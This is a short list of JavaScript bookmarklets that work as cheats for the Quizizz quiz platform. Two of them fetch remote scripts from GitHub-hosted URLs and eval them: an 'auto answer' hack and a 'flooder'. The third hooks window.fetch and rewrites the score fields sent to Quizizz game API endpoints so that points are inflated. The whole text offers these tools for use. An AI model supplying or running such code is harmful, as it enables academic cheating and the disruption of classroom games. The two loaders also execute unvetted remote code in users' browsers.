//These are mostly untested, so some messing around w/ them might be nessesary. 
//Auto answer
javascript:fetch('https://thatfrueddued.github.io/quizizz-hack/Quizizz.js').then(function(response){response.text().then(function(text){eval(text);});});
//Points and powerups
javascript:(()=>{const e=parseInt(prompt(&quot;Points per question (max is 7000):&quot;))-5e3,o=fetch;window.fetch=function(r,s){if([&quot;https://game.quizizz.com/play-api/v4/soloProceed&quot;,&quot;https://game.quizizz.com/play-api/v4/proceedGame&quot;].includes(r)){const o=JSON.parse(s.body);o.response.provisional.scores={correct:e+5e3,incorrect:e+5e3},o.response.provisional.scoreBreakups={correct:{base:5e3,timer:5e3,streak:5e3,powerups:[],total:e+5e3},incorrect:{base:5e3,timer:5e3,streak:5e3,powerups:[],total:e+5e3}},s.body=JSON.stringify(o)}return o(r,s)}})();
//Flooder
javascript:(function()%7Bfetch(%22https%3A%2F%2Fraw.githubusercontent.com%2Fseanv999%2Fquizizz-flooder%2Fmain%2Fflood.js%22)%0A.then((res)%20%3D%3E%20res.text()%0A.then((t)%20%3D%3E%20eval(t)))%7D)()%3B
